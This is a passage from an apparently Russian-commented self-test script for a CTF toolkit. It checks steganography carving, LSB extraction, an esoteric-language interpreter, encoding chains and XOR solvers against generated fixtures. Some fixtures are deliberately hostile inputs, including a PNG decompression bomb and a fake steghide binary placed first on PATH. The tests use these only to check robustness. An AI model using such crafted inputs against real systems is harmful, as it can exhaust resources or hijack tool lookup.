          r.stdout[-400:] + r.stderr)

    # whitespace: куча, цикл, call/ret, арифметика и ввод — по спецификации
    S, T, L = " ", "\t", "\n"

    def _num(v):
        return (S if v >= 0 else T) + "".join(T if b == "1" else S
                                              for b in bin(abs(v))[2:]) + L

    def _lab(s):
        return "".join(T if b == "1" else S for b in s) + L

    def push(v):
        return S + S + _num(v)

    dup, discard, swap = S + L + S, S + L + L, S + L + T
    add, sub, mod = T + S + S + S, T + S + S + T, T + S + T + T
    store, retrieve = T + T + S, T + T + T
    outc, outn, readc = T + L + S + S, T + L + S + T, T + L + T + S

    def mark(lb):
        return L + S + S + _lab(lb)

    def call(lb):
        return L + S + T + _lab(lb)

    def jump(lb):
        return L + S + L + _lab(lb)

    def jz(lb):
        return L + T + S + _lab(lb)

    ws_text = "CTF{ws_heap_loop}"
    prog = ""
    for k, ch in enumerate(ws_text + "\0"):          # строка в куче с адреса 100
        prog += push(100 + k) + push(ord(ch)) + store
    prog += push(100) + call("1") + push(7) + push(-3) + swap + sub + outn
    prog += push(17) + push(5) + mod + outn + push(0) + readc
    prog += push(0) + retrieve + outc + L + L + L
    # подпрограмма: печатать кучу с адреса на стеке до нуля
    prog += mark("1") + mark("10") + dup + retrieve + dup + jz("11")
    prog += outc + push(1) + add + jump("10") + mark("11") + discard + discard + L + T + L
    wsp = os.path.join(tmp, "heap_loop.ws")
    with open(wsp, "w", newline="") as f:
        f.write(prog)
    r = run("stego/whitespace.py", wsp, "--input", "!")       # без --mode: auto
    check("whitespace heap/loop/call", ws_text + "-102!" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # carve: PCAP режется по записям, голые сигнатуры не плодят гигабайты
    def _dir_size(d):
        return sum(os.path.getsize(os.path.join(d, f)) for f in os.listdir(d)) \
            if os.path.isdir(d) else 0

    spam = os.path.join(tmp, "pcap_spam.bin")
    with open(spam, "wb") as f:
        f.write(b"HEAD" + b"\xd4\xc3\xb2\xa1" * 5000 + b"\x0a\x0d\x0d\x0a" * 500)
    out = os.path.join(tmp, "carve_spam")
    r = run("stego/carve.py", spam, "--out", out)
    check("carve pcap signature spam bounded",
          _dir_size(out) <= 2 * os.path.getsize(spam),
          f"carved {_dir_size(out)} bytes\n" + r.stdout[-300:] + r.stderr)

    pcap = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    for k, payload in enumerate([b"A" * 60, b"CTF{pcap_records}" + b"B" * 30]):
        pcap += struct.pack("<IIII", 1000 + k, 0, len(payload), len(payload)) + payload
    host = os.path.join(tmp, "host_pcap.bin")
    with open(host, "wb") as f:
        f.write(b"JUNK" * 10 + pcap + b"\xff" * 5000)
    out = os.path.join(tmp, "carve_pcap")
    r = run("stego/carve.py", host, "--out", out)
    got = [f for f in os.listdir(out) if f.endswith(".pcap")] if os.path.isdir(out) else []
    check("carve pcap by records",
          len(got) == 1 and open(os.path.join(out, got[0]), "rb").read() == pcap,
          r.stdout[-400:] + r.stderr)

    # jpeg_tail: конец JPEG по маркерам, а не последнее FF D9
    def _jpg(color, size=(16, 16)):
        b = io.BytesIO()
        Image.new("RGB", size, color).save(b, "JPEG")
        return b.getvalue()

    zb = io.BytesIO()
    with zipfile.ZipFile(zb, "w", zipfile.ZIP_STORED) as z:
        z.writestr("ffd9.bin", b"AA\xff\xd9BB" + b"CTF{jpeg_tail_zip}")
    zip_ffd9 = zb.getvalue()
    first = _jpg((1, 2, 3))
    p = os.path.join(tmp, "jpeg_jpeg.jpg")
    with open(p, "wb") as f:
        f.write(first + _jpg((200, 9, 9)))
    r = run("stego/jpeg_tail.py", p)
    check("jpeg_tail jpeg+jpeg",
          f"на смещении: {len(first)}" in r.stdout and ".jpg" in r.stdout,
          r.stdout[-400:] + r.stderr)
    p = os.path.join(tmp, "jpeg_zip_ffd9.jpg")
    with open(p, "wb") as f:
        f.write(first + zip_ffd9)
    out = os.path.join(tmp, "jpeg_zip_out")
    r = run("stego/jpeg_tail.py", p, "--extract", out)
    check("jpeg_tail zip with ffd9", os.path.exists(os.path.join(out, "ffd9.bin")),
          r.stdout[-400:] + r.stderr)
    # два скана, FF00/RST/FF-заполнитель в данных, COM с FFD9 между сканами
    sos = b"\xff\xda" + (8).to_bytes(2, "big") + b"\x01\x01\x00\x00\x3f\x00"
    com = b"\xff\xfe" + (6).to_bytes(2, "big") + b"\xff\xd9\xff\xd9"
    scans = (b"\xff\xd8" + sos + b"\x12\xff\x00\x34\xff\xd0\x56\xff\xff\x00"
             + com + sos + b"\x77\xff\x00" + b"\xff\xd9")
    p = os.path.join(tmp, "jpeg_scans.jpg")
    with open(p, "wb") as f:
        f.write(scans + zip_ffd9)
    r = run("stego/jpeg_tail.py", p)
    check("jpeg_tail scans/RST/FF00",
          f"на смещении: {len(scans)}" in r.stdout and ".zip" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # png_chunks --fix: высоту уменьшили, CRC IHDR оставили — размер из CRC
    im = Image.new("RGB", (37, 23), (0, 0, 0))
    for x in range(37):
        im.putpixel((x, 22), (255, 255, 255))
    b = io.BytesIO()
    im.save(b, "PNG")
    raw = bytearray(b.getvalue())
    raw[20:24] = struct.pack(">I", 10)            # IHDR height, CRC прежний
    p = os.path.join(tmp, "ihdr_short.png")
    with open(p, "wb") as f:
        f.write(raw)
    fixed = os.path.join(tmp, "ihdr_fixed.png")
    r = run("stego/png_chunks.py", p, "--fix", fixed)
    try:
        with Image.open(fixed) as im2:
            im2.load()
            size = im2.size
    except Exception as e:
        size = repr(e)
    check("png_chunks --fix dims from crc", size == (37, 23),
          f"size={size}\n" + r.stdout[-400:] + r.stderr)

    # png_chunks: zTXt-бомба распаковывается с пределом, короткий IHDR не падает
    import contextlib
    import importlib.util
    import tracemalloc
    import zlib

    def _chunk(t, d):
        return (struct.pack(">I", len(d)) + t + d
                + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF))

    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    comp = zlib.compressobj(9)                    # 150 МБ нулей -> ~150 КБ
    bomb = comp.compress(b"CTF{ztxt_bomb}")
    zeros = b"\x00" * (1 << 20)
    for _ in range(150):
        bomb += comp.compress(zeros)
    bomb += comp.flush()
    p = os.path.join(tmp, "ztxt_bomb.png")
    with open(p, "wb") as f:
        f.write(png_sig + _chunk(b"IHDR", ihdr) + _chunk(b"zTXt", b"k\x00\x00" + bomb)
                + _chunk(b"IDAT", zlib.compress(b"\x00" * 4)) + _chunk(b"IEND", b""))
    spec = importlib.util.spec_from_file_location(
        "png_chunks_selftest", os.path.join(KIT, "stego", "png_chunks.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    buf = io.StringIO()
    old_argv = sys.argv
    sys.argv = ["png_chunks.py", p]
    tracemalloc.start()
    try:
        with contextlib.redirect_stdout(buf):
            mod.main()
        peak = tracemalloc.get_traced_memory()[1]
    except Exception as e:
        peak = None
        buf.write(repr(e))
    finally:
        tracemalloc.stop()
        sys.argv = old_argv
    check("png_chunks ztxt bomb limited",
          peak is not None and peak < 64 << 20 and "CTF{ztxt_bomb}" in buf.getvalue(),
          f"peak={peak}\n" + buf.getvalue()[-300:])
    bad = []
    for n in (8, 9, 12):
        p = os.path.join(tmp, f"ihdr_{n}.png")
        with open(p, "wb") as f:
            f.write(png_sig + _chunk(b"IHDR", ihdr[:n]) + _chunk(b"IEND", b""))
        r = run("stego/png_chunks.py", p)
        if "Traceback" in r.stderr or r.returncode != 0:
            bad.append(f"{n}: {r.stderr[-200:]}")
    check("png_chunks short IHDR", not bad, "\n".join(bad))

    # враждебный ввод: время работы ограничено (без предела — зависание)
    def _run_limited(rel, *args, timeout=60):
        try:
            return subprocess.run([PY, os.path.join(KIT, rel), *map(str, args)],
                                  capture_output=True, text=True, encoding="utf-8",
                                  errors="replace", env=ENV, timeout=timeout)
        except subprocess.TimeoutExpired:
            return None

    p = os.path.join(tmp, "deadfish_huge.txt")
    with open(p, "w") as f:
        f.write("iiisdo" + "s" * 40 + "o")          # 8, затем 8^(2^40)
    r = _run_limited("stego/esolang.py", p, "--lang", "deadfish", timeout=20)
    check("esolang deadfish huge numbers bounded",
          r is not None and "out: '8" in r.stdout,
          "timeout" if r is None else r.stdout[-300:] + r.stderr[-300:])

    rows = [".####", "#....", "#....", "#....", ".####"]
    glyph_c = "".join(f"{x},{y}\n" for y, row in enumerate(rows)
                      for x, ch in enumerate(row) if ch == "#")
    bad = []
    # далёкая точка (раньше холст 20000001x5 — сотни МБ и секунды) и
    # совсем огромные/inf координаты (раньше OverflowError)
    for tag, extra in (("far", "20000000,2\n"),
                       ("huge", f"{10 ** 30},0\n1e400,0\n0,1e300\n")):
        p = os.path.join(tmp, f"bitmap_{tag}.csv")
        with open(p, "w") as f:
            f.write("x,y\n" + glyph_c + extra)
        r = _run_limited("stego/bitmap_font.py", p, "--decode", timeout=60)
        if r is None:
            bad.append(f"{tag}: timeout")
        elif not ("холст: 9x" in r.stdout and "decode: C" in r.stdout
                  and "Traceback" not in r.stderr):
            bad.append(f"{tag}: " + r.stdout[-300:] + r.stderr[-300:])
    check("bitmap_font huge coordinates", not bad, "\n".join(bad))
def checks_core(tmp):
    """Ядро solve: условие задачи (#81), JSON/события (#82), цепочки (#83)."""
    import re as _re
    sys.path.insert(0, KIT)
    import solve as _solve

    # 81. parse_statement: категория, подсказки, формат флага, пароль, адрес
    st = _solve.parse_statement(
        "Категория: Crypto\nСообщение прогнали через XOR, а потом в base64. "
        "Формат флага: QWE{...}. Пароль: \"pa55word\". Сервер: nc 127.0.0.1 31337")
    check("solve parse_statement ru",
          st["category"] == "crypto" and st["hints"][:2] == ["xor", "base64"]
          and st["flag_prefixes"] == ["QWE"] and "pa55word" in st["passwords"]
          and "127.0.0.1:31337" in st["hosts"],
          json.dumps(st, ensure_ascii=False))
    st = _solve.parse_statement(
        "The message is hidden in the least significant bits of the picture. "
        "Flag format: flag{[a-z_]+}. Source: http://chall.local:8080/")
    check("solve parse_statement en",
          st["category"] == "stego" and st["hints"][:1] == ["lsb"]
          and st["urls"] == ["http://chall.local:8080/"],
          json.dumps(st, ensure_ascii=False))

    # 81b. --desc меняет порядок плана и добавляет префикс флага
    ddir = os.path.join(tmp, "core_desc")
    os.makedirs(ddir, exist_ok=True)
    dflag = "QWE{" + hashlib.sha1(b"core-desc").hexdigest()[:12] + "}"
    note = os.path.join(ddir, "note.txt")
    with open(note, "w", encoding="utf-8") as f:
        f.write("some note text with numbers 12345\n" + dflag + "\n")

    def _plan_pos(text, tool):
        for i, line in enumerate(text.splitlines()):
            if _re.match(r"\s+\d+\. " + tool + r"\b", line):
                return i
        return 10 ** 6

    r0 = run("solve.py", note, "--plan")
    r1 = run("solve.py", note, "--plan", "--desc",
             "Подсказка: brainfuck. Формат флага: QWE{...}")
    check("solve --desc plan order",
          _plan_pos(r0.stdout, "xorknown") < _plan_pos(r0.stdout, "esolang")
          and _plan_pos(r1.stdout, "esolang") < _plan_pos(r1.stdout, "xorknown")
          and "--known QWE{" in r1.stdout and "QWE{…}" in r1.stdout,
          r0.stdout[-800:] + "\n----\n" + r1.stdout[-1200:] + r1.stderr)
    r2 = run("solve.py", note, "--time", "40", "--desc", "flag format: QWE{...}")
    check("solve --desc flag prefix", dflag in r2.stdout, r2.stdout[-800:] + r2.stderr)
    desc_file = os.path.join(ddir, "statement.md")
    with open(desc_file, "w", encoding="utf-8") as f:
        f.write("Ответь на 100 раундов: nc 127.0.0.1 31337\n")
    r3 = run("solve.py", "--desc-file", desc_file)
    check("solve --desc-file target",
          "127.0.0.1:31337" in r3.stdout and "game --connect" in r3.stdout,
          r3.stdout[-800:] + r3.stderr)

    # 82. --json: в stdout один JSON с шагами и флагом; --events: поток событий
    jdir = os.path.join(tmp, "core_json")
    os.makedirs(jdir, exist_ok=True)
    jflag = "CTF{" + hashlib.sha1(b"core-json").hexdigest()[:12] + "}"
    jfile = os.path.join(jdir, "blob.txt")
    with open(jfile, "w", encoding="utf-8") as f:
        f.write(base64.b64encode(jflag.encode()).decode() + "\n")
    r = run("solve.py", jfile, "--time", "40", "--json")
    try:
        doc = json.loads(r.stdout)
    except ValueError:
        doc = {}
    step_keys = {"n", "tool", "args", "why", "timeout", "status", "rc", "seconds",
                 "output_tail", "flags", "leads"}
    steps = doc.get("steps") or []
    check("solve --json",
          r.stdout.strip().count("\n") == 0 and doc.get("flag") == jflag
          and doc.get("status") == "solved" and doc.get("plan") and steps
          and all(step_keys <= set(s) for s in steps)
          and any(jflag in s["flags"] for s in steps)
          and all(s["status"] in ("ok", "fail", "timeout", "killed", "skipped") for s in steps)
          and "[+] тип" in r.stderr,
          r.stdout[-800:] + r.stderr[-400:])
    evfile = os.path.join(jdir, "events.jsonl")
    r = run("solve.py", jfile, "--time", "40", "--jobs", "1", "--events", evfile)
    try:
        with open(evfile, encoding="utf-8") as f:
            evs = [json.loads(line) for line in f if line.strip()]
    except (OSError, ValueError):
        evs = []
    names = [e.get("event") for e in evs]
    fl = next((e for e in evs if e.get("event") == "flag"), {})
    fn = fl.get("n")
    ordered = False
    if names and fn is not None:
        i_start = next((i for i, e in enumerate(evs)
                        if e["event"] == "step_start" and e.get("n") == fn), -1)
        i_end = next((i for i, e in enumerate(evs)
                      if e["event"] == "step_end" and e.get("n") == fn), -1)
        i_flag = names.index("flag")
        ordered = (names[0] == "plan" and names[-1] == "done"
                   and 0 < i_start < i_end < i_flag < len(names) - 1
                   and evs[-1].get("flag") == jflag and fl.get("flag") == jflag)
    check("solve --events order", ordered and "ФЛАГ" in r.stdout,
          " ".join(map(str, names)) + "\n" + r.stdout[-400:] + r.stderr[-400:])
    r = run("solve.py", base64.b64encode(jflag.encode()).decode(), "--events", "-")
    try:
        evs = [json.loads(line) for line in r.stdout.splitlines() if line.strip()]
    except ValueError:
        evs = []
    check("solve --events - stdout",
          evs and evs[0]["event"] == "plan" and evs[-1]["event"] == "done"
          and evs[-1]["flag"] == jflag and "[+] цель: строка" in r.stderr,
          r.stdout[-600:] + r.stderr[-300:])

    # 83. цепочка из 4 слоёв: base64 → hex → ROT13 → однобайтовый XOR
    up, lo = bytes(range(65, 91)), bytes(range(97, 123))
    rot13 = bytes.maketrans(up + lo, up[13:] + up[:13] + lo[13:] + lo[:13])
    cflag = ("CTF{multi_layer_chain_" + hashlib.sha1(b"core-chain").hexdigest()[:6]
             + "}").encode()
    ckey = hashlib.sha1(b"core-chain-key").digest()[0] | 1
    while cflag.translate(bytes(b ^ ckey for b in range(256))).translate(rot13) == \
            cflag.translate(bytes(b ^ ckey for b in range(256))):
        ckey = (ckey + 2) % 256 or 1      # ROT13 должен реально менять слой
    xored = bytes(b ^ ckey for b in cflag)
    layered = base64.b64encode(xored.translate(rot13).hex().encode()).decode()
    r = run("crypto/chain.py", layered)
    check("crypto/chain.py 4 layers",
          ("ФЛАГ: " + cflag.decode()) in r.stdout
          and "base64 → hex → rot13 → xor:0x%02x" % ckey in r.stdout,
          r.stdout[-800:] + r.stderr[-400:])
    # обратный порядок: XOR → ROT13 → hex → base64, бинарный файл
    rev = bytes(b ^ ckey for b in base64.b64encode(cflag).hex().encode().translate(rot13))
    cdir = os.path.join(tmp, "core_chain")
    os.makedirs(cdir, exist_ok=True)
    rev_path = os.path.join(cdir, "layers.bin")
    with open(rev_path, "wb") as f:
        f.write(rev)
    r = run("crypto/chain.py", "--file", rev_path)
    check("crypto/chain.py reverse order",
          ("ФЛАГ: " + cflag.decode()) in r.stdout, r.stdout[-800:] + r.stderr[-400:])
    # solve сам доходит до цепочки на текстовом файле
    lay_path = os.path.join(cdir, "layers.txt")
    with open(lay_path, "w", encoding="utf-8") as f:
        f.write(layered + "\n")
    r = run("solve.py", lay_path, "--time", "60")
    check("solve chain 4 layers", cflag.decode() in r.stdout and "chain" in r.stdout,
          r.stdout[-900:] + r.stderr[-400:])
    r = run("crypto/chain.py", "--file", os.path.join(cdir, "missing.bin"))
    r2 = run("crypto/chain.py", "--file", cdir)
    check("crypto/chain.py no file",
          r.returncode == 1 and r2.returncode == 1 and "не могу прочитать" in r.stdout
          and "Traceback" not in r.stderr + r2.stderr,
          r.stdout[-300:] + r.stderr[-300:] + r2.stderr[-300:])
def _lsb_image(path, fmt, flag, order="rgb", plane=0, w=64, h=64, **save_kw):
    """Картинка с шумом; флаг+NUL пишется в бит plane каналов по кругу order."""
    rnd = random.Random(7)
    arr = [[[rnd.randrange(256) for _ in range(3)] for _ in range(w)] for _ in range(h)]
    bits = [(b >> (7 - i)) & 1 for b in flag.encode() + b"\0" for i in range(8)]
    idx = {"rgb": (0, 1, 2), "bgr": (2, 1, 0)}[order]
    k = 0
    for y in range(h):
        for x in range(w):
            for c in idx:
                if k < len(bits):
                    arr[y][x][c] = (arr[y][x][c] & ~(1 << plane)) | (bits[k] << plane)
                    k += 1
    im = Image.new("RGB", (w, h))
    im.putdata([tuple(p) for row in arr for p in row])
    im.save(path, fmt, **save_kw)


def checks_stego_new(tmp):
    # #95: zsteg-подобный перебор раскладок (BGR, бит 3 — не «классика»)
    f95 = "CTF{" + "lsb_brute_" + "ok}"
    p = os.path.join(tmp, "brute_bgr.png")
    _lsb_image(p, "PNG", f95, order="bgr", plane=2)
    r = run("toolbox.py", "zsteg", p)
    check("zsteg bgr plane3", f95 in r.stdout, r.stdout[-500:] + r.stderr)
    r = run("stego/lsb_brute.py", os.path.join(tmp, "no_such.png"))
    check("zsteg missing path", "Traceback" not in r.stderr and "[-]" in r.stdout,
          r.stdout + r.stderr)
    r = run("stego/lsb_brute.py", tmp)
    check("zsteg directory", "Traceback" not in r.stderr and "[-]" in r.stdout,
          r.stdout + r.stderr)

    # #96: классический 1-LSB R,G,B в BMP / TIFF / WEBP(lossless): reader + solve
    f96 = "CTF{" + "fmt_lsb_ok}"
    for ext, fmt, kw in (("bmp", "BMP", {}), ("tiff", "TIFF", {}),
                         ("webp", "WEBP", {"lossless": True, "exact": True})):
        p = os.path.join(tmp, "classic." + ext)
        _lsb_image(p, fmt, f96, **kw)
        r = run("stego/lsb_brute.py", p)
        check(f"zsteg {ext} reader", f96 in r.stdout, r.stdout[-400:] + r.stderr)
        r = run("solve.py", p, "--time", 40)
        check(f"solve {ext} lsb", f96 in r.stdout, r.stdout[-600:] + r.stderr)

def checks_wav_lsb(tmp):
    """stego/wav_lsb.py: LSB в сэмплах WAV (16/24-бит) и эхо-скрытие.

    Все артефакты генерируются кодом (модуль wave), без ручного base64.
    """
    rng = random.Random(SEED)

    def _bits_lsb(data):
        # порядок байта little-endian (lsb-first): bit0 сначала
        return [(byte >> b) & 1 for byte in data for b in range(8)]

    def _pack24(v):
        v = int(v) & 0xFFFFFF
        return bytes((v & 0xFF, (v >> 8) & 0xFF, (v >> 16) & 0xFF))

    # (a) 16-бит моно: флаг в 1 младшем бите всех сэмплов, lsb-first
    flag16 = "CTF{wav_lsb_16bit}"
    n16 = 4000
    s16 = [rng.randrange(-8000, 8000) for _ in range(n16)]
    bits = _bits_lsb(flag16.encode())
    for i, bit in enumerate(bits):
        s16[i] = (s16[i] & ~1) | bit
    wav16 = os.path.join(tmp, "wavlsb16.wav")
    with wave.open(wav16, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(16000)
        w.writeframes(b"".join(struct.pack("<h", x) for x in s16))
    r = run("stego/wav_lsb.py", wav16)
    check("stego/wav_lsb.py 16bit", flag16 in r.stdout, r.stdout[:800] + r.stderr)

    # (b) 24-бит стерео: флаг в 1 младшем бите левого канала
    flag24 = "CTF{wav24_lsb}"
    n24 = 3000
    left = [rng.randrange(-800000, 800000) for _ in range(n24)]
    right = [rng.randrange(-800000, 800000) for _ in range(n24)]
    bits = _bits_lsb(flag24.encode())
    for i, bit in enumerate(bits):
        left[i] = (left[i] & ~1) | bit
    frames = bytearray()
    for i in range(n24):
        frames += _pack24(left[i]) + _pack24(right[i])
    wav24 = os.path.join(tmp, "wavlsb24.wav")
    with wave.open(wav24, "w") as w:
        w.setnchannels(2); w.setsampwidth(3); w.setframerate(16000)
        w.writeframes(bytes(frames))
    r = run("stego/wav_lsb.py", wav24)
    check("stego/wav_lsb.py 24bit", flag24 in r.stdout, r.stdout[:800] + r.stderr)

    # (c) эхо-скрытие: на каждый бит добавляем задержанную ослабленную копию
    #     сегмента (d0 кодирует 0, d1 — 1). Декодер — кепстральный.
    seg_len, d0, d1, alpha = 2048, 50, 100, 0.6
    echo_flag = "CTF{echo}"
    ebits = [(byte >> b) & 1 for byte in echo_flag.encode() for b in range(7, -1, -1)]
    nseg = len(ebits)
    host = [rng.gauss(0, 3000) for _ in range((nseg + 1) * seg_len)]
    out = list(host)
    for k, bit in enumerate(ebits):
        st = k * seg_len
        d = d1 if bit else d0
        for i in range(d, seg_len):
            out[st + i] = host[st + i] + alpha * host[st + i - d]
    out16 = [max(-32768, min(32767, int(x))) for x in out]
    echo_wav = os.path.join(tmp, "wavecho.wav")
    with wave.open(echo_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(16000)
        w.writeframes(b"".join(struct.pack("<h", x) for x in out16))
    expect_bits = "".join(str(b) for b in ebits)
    r = run("stego/wav_lsb.py", echo_wav, "--echo",
            "--seg", seg_len, "--d0", d0, "--d1", d1)
    # сильнее: восстановленный флаг; мягче (fallback по заданию): битовый шаблон
    check("stego/wav_lsb.py echo",
          echo_flag in r.stdout or expect_bits in r.stdout,
          r.stdout[:800] + r.stderr)

    # (d) не PCM WAV / отсутствующий путь — без трейсбека, rc=0
    notwav = os.path.join(tmp, "wavlsb_bad.wav")
    open(notwav, "w", encoding="utf-8").write('{"code":"ACCESS_DENIED"}')
    r = run("stego/wav_lsb.py", notwav)
    check("stego/wav_lsb.py not-wav",
          r.returncode == 0 and "не PCM WAV" in r.stdout and "Traceback" not in r.stderr,
          r.stdout + r.stderr)
def checks_stego_crack(tmp):
    """stego/stego_crack.py: подставной steghide находит флаг; без тулз — подсказка."""
    fakebin = os.path.join(tmp, "stego_fakebin")
    os.makedirs(fakebin, exist_ok=True)
    pw = "hunter2stego"
    flag = "CTF{fake_steghide_" + hashlib.md5(pw.encode()).hexdigest()[:8] + "}"

    # подставной steghide: "извлекает" флаг только при верном пароле (-p),
    # пишет в файл, указанный через -xf; иначе выходит с ошибкой.
    impl = os.path.join(fakebin, "steghide_impl.py")
    with open(impl, "w", encoding="utf-8") as f:
        f.write(
            "import sys\n"
            "a = sys.argv[1:]\n"
            "def opt(k):\n"
            "    return a[a.index(k) + 1] if k in a and a.index(k) + 1 < len(a) else None\n"
            "pw = opt('-p'); xf = opt('-xf')\n"
            f"if pw == {pw!r} and xf:\n"
            f"    open(xf, 'wb').write({flag!r}.encode() + b'\\n'); sys.exit(0)\n"
            "sys.stderr.write('could not extract any data with that passphrase!\\n')\n"
            "sys.exit(1)\n")
    # .bat-обёртка: shutil.which найдёт её по PATHEXT, subprocess запустит
    bat = os.path.join(fakebin, "steghide.bat")
    with open(bat, "w", encoding="utf-8") as f:
        f.write("@echo off\r\n\"%s\" \"%s\" %%*\r\n" % (PY, impl))

    carrier = os.path.join(tmp, "stego_crack_carrier.jpg")
    Image.new("RGB", (16, 16), (20, 40, 60)).save(carrier, "JPEG")

    # (a) подставной steghide первым на PATH — флаг и пароль должны найтись
    env_a = {"PATH": fakebin + os.pathsep + os.environ.get("PATH", "")}
    r = run("stego/stego_crack.py", carrier, "--desc", f'пароль "{pw}" в картинке',
            "--no-sibling", env=env_a)
    ok_a = (flag in r.stdout and pw in r.stdout and "steghide" in r.stdout
            and "Traceback" not in (r.stderr or "") and r.returncode == 0)
    check("stego_crack: подставной steghide находит флаг", ok_a,
          (r.stdout or "")[-900:] + (r.stderr or "")[-400:])

    # (b) инструментов нет на PATH — чистая подсказка, без трейсбека
    r2 = run("stego/stego_crack.py", carrier, "--no-sibling")
    ok_b = ("Traceback" not in (r2.stderr or "") and r2.returncode == 0
            and "steghide extract -sf" in r2.stdout)
    check("stego_crack: без тулз — подсказка, не трейсбек", ok_b,
          (r2.stdout or "")[-700:] + (r2.stderr or "")[-400:])


def main():
    global SEED, FUZZ, QUICK, TIMEOUT
    argv = sys.argv[1:]
    QUICK = "--quick" in argv
    for i, a in enumerate(argv):
        if a == "--seed" and i + 1 < len(argv):
            SEED = int(argv[i + 1])
        elif a == "--fuzz" and i + 1 < len(argv):
            FUZZ = max(0, int(argv[i + 1]))
        elif a == "--timeout" and i + 1 < len(argv):
            TIMEOUT = int(argv[i + 1])
    tmp = tempfile.mkdtemp(prefix="ctfkit_")
    atexit.register(shutil.rmtree, tmp, True)
    print("temp:", tmp)

    # 1. enc
    r = run("enc.py", "Q1RGe2ZsYWd9")
    check("enc.py base64", "CTF{flag}" in r.stdout, r.stdout + r.stderr)

    # 3b. enc: rot47, математические буквы (NFKC), восьмеричные коды
    rot = "".join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c
                  for c in "CTF{rot47}")
    r = run("enc.py", rot)
    check("enc.py rot47", "CTF{rot47}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "ＣＴＦ{ｆａｎｃｙ}")
    check("enc.py nfkc", "CTF{fancy}" in r.stdout, r.stdout + r.stderr)
    oct_s = " ".join(oct(ord(c))[2:] for c in "CTF{octal}")
    r = run("enc.py", oct_s)
    check("enc.py octal", "CTF{octal}" in r.stdout, r.stdout + r.stderr)
    a85 = base64.a85encode(b"CTF{ascii85}").decode()
    r = run("enc.py", a85)
    check("enc.py ascii85", "CTF{ascii85}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "PGS{ebg63}")
    check("enc.py rot18", "CTF{rot18}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "=?UTF-8?B?Q1RGe21pbWV9?=")
    check("enc.py mime", "CTF{mime}" in r.stdout, r.stdout + r.stderr)

    # 3c. enc: кодеки (utf-16/32, cp1251) и редкие base (36, z85)
    for label, blob, want in (
        ("utf16", "CTF{utf16}".encode("utf-16-le"), "CTF{utf16}"),
        ("utf32", "CTF{utf32}".encode("utf-32-le"), "CTF{utf32}"),
        ("cp1251", "Привет CTF{cyr}".encode("cp1251"), "CTF{cyr}"),
    ):
        cp = os.path.join(tmp, f"enc_{label}.bin")
        with open(cp, "wb") as f:
            f.write(blob)
        r = run("enc.py", "--file", cp)
        check(f"enc.py {label}", want in r.stdout, r.stdout[:600] + r.stderr)

    _v = int.from_bytes(b"CTF{b36}", "big")
    _b36 = ""
    while _v:
        _v, _r = divmod(_v, 36)
        _b36 = "0123456789abcdefghijklmnopqrstuvwxyz"[_r] + _b36
    r = run("enc.py", _b36)
    check("enc.py base36", "CTF{b36}" in r.stdout, r.stdout[:600] + r.stderr)

    _z85a = ("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
             ".-:+=^!/*?&<>()[]{}@%$#")
    _raw = b"CTF{z85}"
    _raw += b"\x00" * (-len(_raw) % 4)
    _z85 = ""
    for _i in range(0, len(_raw), 4):
        _val = int.from_bytes(_raw[_i:_i + 4], "big")
        _part = ""
        for _ in range(5):
            _val, _rem = divmod(_val, 85)
            _part = _z85a[_rem] + _part
        _z85 += _part
    r = run("enc.py", _z85)
    check("enc.py z85", "CTF{z85}" in r.stdout, r.stdout[:600] + r.stderr)

    _b92a = ("!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "[\\]^_abcdefghijklmnopqrstuvwxyz{|}")
    _bits = "".join(f"{b:08b}" for b in b"CTF{base92}")
    _bits += "0" * (-len(_bits) % 13)
    _b92 = ""
    for _i in range(0, len(_bits), 13):
        _val = int(_bits[_i:_i + 13], 2)
        _b92 += _b92a[_val // 91] + _b92a[_val % 91]
    r = run("enc.py", _b92)
    check("enc.py base92", "CTF{base92}" in r.stdout, r.stdout[:600] + r.stderr)

    _b100 = "".join(chr(0x1F3F7 + b) for b in b"CTF{base100}")
    r = run("enc.py", _b100)
    check("enc.py base100", "CTF{base100}" in r.stdout, r.stdout[:600] + r.stderr)

    # 2. runs
    p = os.path.join(tmp, "runs.txt")
    open(p, "w").write("<" * 67 + ">" * 84 + "{" * 123)
    r = run("stego/runs.py", p)
    check("stego/runs.py", "CT{" in r.stdout, r.stdout + r.stderr)

    # 3. genetic
    r = run("crypto/genetic.py", "UGUACUUUC")
    check("crypto/genetic.py", "CTF" in r.stdout, r.stdout + r.stderr)

    # 4. xor_known
    key = b"aB!12"
    plain = b"This is my message: hello CTF{xor}"
    ct = bytes(c ^ key[i % len(key)] for i, c in enumerate(plain)).hex()
    r = run("crypto/xor_known.py", "--hex", ct, "--known", "This is my message: ", "--keylen", "5")
    check("crypto/xor_known.py", "CTF{xor}" in r.stdout and "aB!12" in r.stdout, r.stdout + r.stderr)

    # 4b. xor_known: длина ключа подбирается сама
    r = run("crypto/xor_known.py", "--hex", ct, "--known", "This is my message: ")
    check("crypto/xor_known.py auto-keylen",
          "CTF{xor}" in r.stdout and "aB!12" in r.stdout, r.stdout + r.stderr)

    # 4c. known-текст задан в нижнем регистре, а флаг — в верхнем
    ck = b"K3y!"
    cplain = b"CTF{case_known}"
    cct = bytes(c ^ ck[i % len(ck)] for i, c in enumerate(cplain)).hex()
    r = run("crypto/xor_known.py", "--hex", cct, "--known", "ctf{")
    check("crypto/xor_known.py case", "CTF{case_known}" in r.stdout, r.stdout + r.stderr)

    # 5. caesar
    src = "The quick brown fox jumps over the lazy dog"
    cipher = "".join(chr((ord(c) - 97 + 3) % 26 + 97) if "a" <= c <= "z" else c for c in src.lower())
    r = run("crypto/classical.py", "caesar", "--text", cipher, "--key", "3")
